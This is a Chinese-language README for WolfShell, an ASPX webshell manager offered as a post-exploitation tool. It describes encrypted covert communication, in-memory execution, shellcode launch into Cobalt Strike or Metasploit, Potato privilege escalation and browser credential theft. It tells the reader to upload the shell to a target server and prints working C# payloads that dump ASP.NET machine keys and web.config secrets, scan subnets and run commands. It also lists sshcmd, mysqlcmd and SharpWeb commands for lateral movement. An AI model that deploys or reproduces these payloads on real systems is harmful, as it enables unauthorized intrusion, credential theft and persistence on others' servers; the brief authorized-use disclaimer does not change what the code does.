
![WolfShell](http://www.18k.icu/img/wolfshell/wolf.png)

[![Author](https://img.shields.io/badge/Author-0x7556-blueviolet)](https://github.com/0x7556) 
[![WolfShell](https://img.shields.io/badge/WolfShell-Bin-ff69b4)](https://github.com/0x7556/wolfshell/releases) 
[![GitHub issues](https://img.shields.io/github/issues/0x7556/wolfshell)](https://github.com/0x7556/wolfshell/issues) 
[![Github Stars](https://img.shields.io/github/stars/0x7556/wolfshell)](https://github.com/0x7556/wolfshell) 
[![GitHub forks](https://img.shields.io/github/forks/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)
[![GitHub license](https://img.shields.io/github/license/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)

# 金刚狼：专为ASPX设计的高级WebShell管理工具

金刚狼是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。

## 🚀 核心优势

*   高效隐蔽的通信： 采用 二进制流 传输协议，确保通信的高效性与隐蔽性。
*   端到端安全加密： 所有传输 Payload 均经过 AES加密 保护，且每次通信使用 随机密钥，保障数据安全。
*   无痕运行： 支持直接在 内存中加载并执行代码，最大程度避免在磁盘留下痕迹，显著提升操作隐蔽性和安全性。
*   内网级联WebShell控制： 通过现有已控的WebShell，无需部署代理或配置端口转发，即可直接连接并控制处于更深层内网环境中的WebShell节点，实现便捷高效的内网横向穿透。
*   Hacking后渗透：通过已控的 WebShell 在内存中加载渗透工具，无需部署代理或配置端口转发，即可连接并控制内网的 SSH 服务器与 MySQL 数据库，实现便捷高效的内网横向渗透。(计划添加更多渗透工具，现已实现sshcmd、mysqlcmd)

## 🔥 功能特性

*   Cmd命令执行： 在目标系统上直接执行任意 CMD 命令。
*   文件管理： 在目标系统上枚举目录文件、新建文件、重命令、删除、设置文件时间等。
*   PowerShell命令执行： 支持执行 PowerShell 脚本和命令。
*   Shellcode执行： 可在目标环境内直接执行原生的 Shellcode，一键上线Cobalt Strike、Metasploit。
*   C#代码执行： 支持在运行时动态加载与执行 C# 代码。
*   端口转发： 实现本地端口到远程内网主机的映射，方便安全地访问内部网络服务。
*   HTTP代理： 一键内存注入Suo5高性能 HTTP 隧道代理工具。
*   EfsPotato： 利用系统服务漏洞进行权限提升。
*   BadPotato： 利用系统服务漏洞进行权限提升。
*   内网级联Cmd命令执行： 支持在复杂的内网环境中，级联内网 WebShell 执行 CMD 命令进行横向移动。
*   内网级联PowerShell执行： 支持在复杂的内网环境中，级联内网 WebShell 执行 PowerShell 命令进行横向移动。
*   SshCmd：SSH 远程命令执行工具，支持对内网主机的命令执行、文件上传下载实现横向移动。
*   MyysqlCmd：MySQL 数据库连接工具，支持连接内网MySQL，执行查询、导入导出等数据库操作。
*   SharpWeb：浏览器凭据抓取工具，支持提取已保存的 Chrome、Firefox、Edge 登录信息与凭据。

## 辅助功能

### 加密解密

*   支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
*   支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码

## 安装与使用

1. **下载WolfShell**
   - https://github.com/0x7556/wolfshell/releases

2. **配置环境**
   - 确保目标环境支持ASPX，并已正确配置。

3. **上传WolfShell**
   - 将WolfShell文件上传到目标ASPX服务器。

4. **访问WebShell**
   - 通过工具客户端连接WebShell，默认密码 WolfShell，修改密码可使用工具上的WolfHash加密。

![wolfshell](http://www.18k.icu/img/wolfshell/WolfShell.png)


## 示例

### Cmd命令执行

![CmdShell示例](http://www.18k.icu/img/wolfshell/CmdShell.png)

### PowerShell命令执行

![PowerShell示例](http://www.18k.icu/img/wolfshell/PowerShell.png)


### 文件管理

![FileMgr](http://www.18k.icu/img/wolfshell/FileMgr.png)


### C#代码执行

#### 获取 ValidationKey 示例代码

```csharp

using System;
using System.Reflection;
using System.Web.Configuration;
public class Eval
{
public string eval(Object obj)
{
var sy = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
var gac = mkt.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cg = (MachineKeySection)gac.Invoke(null, new object[0]);
return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Validation + " | " + "DecryptionKey: " + cg.DecryptionKey + " | " + "Decryption: " + cg.Decryption + " | " + "CompatibilityMode: " + cg.CompatibilityMode;
}
}

```

![C#代码示例](http://www.18k.icu/img/wolfshell/CodeViewKey.png)

#### 扫描C段存活主机 示例代码
```csharp

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
public class Eval
{
public string eval(Object obj)
{
StringBuilder iplist = new StringBuilder();
string baseIP = "192.168.1.";
PingOptions options = new PingOptions();
options.DontFragment = true;
var tasks = new Task[254];
for (int i = 1; i < 255; i++)
{
int ipSuffix = i;
tasks[i - 1] = Task.Run(() =>
{
using (Ping myPing = new Ping())
{
PingReply reply = myPing.Send(baseIP + ipSuffix, 120);
if (reply.Status == IPStatus.Success)
{
lock (iplist)
{
iplist.AppendLine("Alive IP: " + reply.Address.ToString());
}
}
}
});
}
Task.WaitAll(tasks);
return iplist.ToString();
}
}


```


![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCping.png)



#### CMD命令执行 示例代码

```csharp

using System;
using System.Diagnostics;
public class Eval
{
public string eval(Object obj)
{
try
{
Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c whoami";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
string result = process.StandardOutput.ReadToEnd();
process.WaitForExit();
return result;
}
catch (Exception ex)
{
return "Error occurred: " + ex.Message;
}
}
}


```

![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCmd.png)


#### 获取web.config密码 示例代码

```csharp

using System;
using System.Configuration;
using System.Text;
public class Eval
{
public string eval(Object obj)
{
try
{
var connectionStrings = ConfigurationManager.ConnectionStrings;
var appSettings = ConfigurationManager.AppSettings;
var result = new StringBuilder();
foreach (ConnectionStringSettings connectionString in connectionStrings)
{
result.AppendLine("Connection string name: " + connectionString.Name);
result.AppendLine("Connection string value: " + connectionString.ConnectionString);
result.AppendLine();
}
result.AppendLine();
foreach (string key in appSettings.AllKeys)
{
result.AppendLine("Key: " + key + ", Value: " + appSettings[key]);
}
return result.ToString();
}
catch (Exception ex)
{
return "Error occurred: " + ex.Message;
}
}
}


```

![C#代码示例](http://www.18k.icu/img/wolfshell/CodeWebConfig.png)


###  加密解密算法

支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码

#### 金刚狼密码

![WolfHash](http://www.18k.icu/img/wolfshell/WolfHash.png)

#### ASCII码加密

![WolfShell](http://www.18k.icu/img/wolfshell/ascii.png)

#### BASE64解密

![WolfShell](http://www.18k.icu/img/wolfshell/unBase64.png)

#### HEX十六进制解密

![WolfShell](http://www.18k.icu/img/wolfshell/unhex.png)



### Potato提权示例

#### efspotato提权

![EfsPotato示例](http://www.18k.icu/img/wolfshell/EfsPotato.png)

#### badpotato提权


![BadPotato示例](http://www.18k.icu/img/wolfshell/BadPotato.png)

### 内网扫描示例

![NetScan示例](http://www.18k.icu/img/wolfshell/NetScan.png)

### 端口转发示例

![端口转发示例](http://www.18k.icu/img/wolfshell/PortTran.png)


### HTTP代理示例

![端口转发示例](http://www.18k.icu/img/wolfshell/Suo5Tunnel.png)

## Hacking后渗透

### SSH远程命令执行示例

```bash
Usage:

sshcmd 192.168.50.128 22 root toor id
sshcmd 192.168.50.128 22 root toor download /tmp/down.rar c:\down.rar
sshcmd 192.168.50.128 22 root toor upload c:\upload.rar /tmp/upload.rar

Keybord
sshcmd 192.168.50.128 22 root toor download2 /tmp/down.rar c:\down.rar
sshcmd 192.168.50.128 22 root toor upload2 c:\upload.rar /tmp/upload.rar
```

![Hacking](http://www.18k.icu/img/wolfshell/sshcmd.png)

### Mysql数据库连接示例

```bash
mysqlcmd host port user pass dbname sqlstr
mysqlcmd host port user pass dbname sqlb64

Demo:
mysqlcmd 192.168.50.139 3306 root WolfShell mysql info
mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT VERSION(); ""
mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT 3+5 ""
mysqlcmd 192.168.50.139 3306 root WolfShell mysql c2VsZWN0IDMrNQ==";
```

![Hacking](http://www.18k.icu/img/wolfshell/mysqlcmd.png)

### 读取浏览器密码示例

```bash
Usage:
    SharWeb arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chrome, FireFox and IE/Edge credentials.
    full      - The same as 'all'
    chrome    - Fetch saved Chrome logins. e.g. -d Directory
    firefox   - Fetch saved FireFox logins. e.g. -p masterkey -d Directory
    edge      - Fetch saved Internet Explorer/Microsoft Edge logins.

Demo:
    SharWeb all
    SharWeb chrome
    SharWeb chrome -d C:\Output
    SharWeb firefox -p mymasterkey -d C:\Output
    SharWeb edge
=======================================================================
```

![Hacking](http://www.18k.icu/img/wolfshell/SharpWeb.png)

## 免责声明

- 使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
- 本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。

## 贡献

欢迎任何形式的贡献！请提交问题、建议或拉取请求。

## 许可证

本项目采用MIT许可证，详细信息请参见[LICENSE](LICENSE)文件。

## 关注

![WolfShell](http://www.18k.icu/img/join.png)
